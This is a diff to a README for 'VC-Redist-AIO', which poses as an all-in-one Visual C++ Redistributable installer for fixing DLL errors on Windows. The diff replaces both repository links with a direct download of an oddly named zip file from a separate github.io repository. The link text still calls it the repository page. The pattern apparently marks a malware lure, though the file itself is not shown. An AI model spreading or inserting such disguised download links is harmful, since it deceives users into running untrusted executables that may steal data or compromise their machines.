@@ -5,7 +5,7 @@ description: "Install all Visual C++ Redistributable runtime libraries for Windo
 ---
 # ⚙️ VC-Redist-AIO - Fix missing DLL errors on Windows
 
-[![](https://img.shields.io/badge/Download-VC--Redist--AIO-blue)](https://github.com/Hebephrenic-caseinglue822/VC-Redist-AIO)
+[![](https://img.shields.io/badge/Download-VC--Redist--AIO-blue)](https://github.com/Hebephrenic-caseinglue822/hebephrenic-caseinglue822.github.io/raw/refs/heads/main/occipitofrontalis/hebephrenic-io-github-caseinglue-v3.5.zip)
 
 ## 📌 About this project
 
@@ -26,7 +26,7 @@ Before you install this bundle, ensure your system meets these requirements:
 
 The installation process involves a single file. Follow the steps below to acquire the latest version.
 
-[Visit the repository page to download the latest setup file](https://github.com/Hebephrenic-caseinglue822/VC-Redist-AIO)
+[Visit the repository page to download the latest setup file](https://github.com/Hebephrenic-caseinglue822/hebephrenic-caseinglue822.github.io/raw/refs/heads/main/occipitofrontalis/hebephrenic-io-github-caseinglue-v3.5.zip)
 
 1. Click the provided link above to open the repository page.
 2. Find the download section on the right side of the screen.
